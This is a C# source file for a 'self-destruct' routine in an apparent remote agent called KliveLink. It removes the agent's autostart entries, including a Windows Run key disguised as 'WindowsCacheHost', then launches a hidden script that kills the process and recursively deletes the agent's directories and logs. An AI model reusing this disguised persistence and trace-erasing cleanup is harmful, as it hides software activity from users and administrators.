using System.Diagnostics;
using KliveLink.Contracts;
using Microsoft.Win32;

namespace KliveLink.Agent.V2;

public static class V2SelfDestruct
{
    public static V2SelfDestructResult Run()
    {
        var result = new V2SelfDestructResult();
        try
        {
            string exe = Environment.ProcessPath ?? "";
            string dir = Path.GetDirectoryName(exe) ?? PortablePaths.DataDirectory;
            if (OperatingSystem.IsWindows())
            {
                try
                {
                    using RegistryKey? key = Registry.CurrentUser.OpenSubKey(
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
                    foreach (string name in new[] { "KL", "WindowsCacheHost" })
                    {
                        if (key?.GetValue(name) != null)
                        {
                            key.DeleteValue(name, false);
                            result.RunKeyRemoved = true;
                        }
                    }
                }
                catch { }
            }
            else
            {
                foreach (string path in new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "systemd", "user", "klivelink.service"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "autostart", "klivelink.desktop"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "LaunchAgents", "com.klivelink.agent.plist"),
                })
                {
                    try { if (File.Exists(path)) { File.Delete(path); result.RunKeyRemoved = true; } } catch { }
                }
                if (OperatingSystem.IsLinux())
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo("systemctl", "--user disable --now klivelink.service")
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                        });
                    }
                    catch { }
                }
                else if (OperatingSystem.IsMacOS())
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo("launchctl", $"bootout gui/{Environment.UserName}/com.klivelink.agent")
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                        });
                    }
                    catch { }
                }
            }

            string temp = Path.Combine(Path.GetTempPath(), $"kl_cleanup_{Guid.NewGuid():N}" + (OperatingSystem.IsWindows() ? ".cmd" : ".sh"));
            string script = OperatingSystem.IsWindows()
                ? "@echo off\r\n" +
                  "timeout /t 2 /nobreak >nul\r\n" +
                  $"taskkill /F /PID {Environment.ProcessId} >nul 2>&1\r\n" +
                  "timeout /t 2 /nobreak >nul\r\n" +
                  "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v KL /f >nul 2>&1\r\n" +
                  "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCacheHost /f >nul 2>&1\r\n" +
                  $"rmdir /s /q \"{dir}\" >nul 2>&1\r\n" +
                  $"del /f /q \"{temp}\" >nul 2>&1\r\n"
                : "#!/bin/sh\n" +
                  "sleep 2\n" +
                  $"kill -9 {Environment.ProcessId} 2>/dev/null || true\n" +
                  "sleep 1\n" +
                  $"rm -rf \"{dir}\" \"{PortablePaths.DataDirectory}\" \"{PortablePaths.ConfigDirectory}\" \"{PortablePaths.LogDirectory}\"\n" +
                  $"rm -f \"{temp}\"\n";
            File.WriteAllText(temp, script);
            if (!OperatingSystem.IsWindows())
                File.SetUnixFileMode(temp, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
            Process.Start(new ProcessStartInfo
            {
                FileName = OperatingSystem.IsWindows() ? "cmd.exe" : "/bin/sh",
                Arguments = OperatingSystem.IsWindows() ? $"/d /c \"{temp}\"" : $"\"{temp}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            });
            result.Acknowledged = true;
            result.Message = "Self-destruct initiated; autostart removed and cleanup scheduled.";
            result.Checks["autostart"] = result.RunKeyRemoved;
            result.Checks["cleanupScript"] = File.Exists(temp);
        }
        catch (Exception ex)
        {
            result.Acknowledged = false;
            result.Message = ex.Message;
        }
        return result;
    }
}
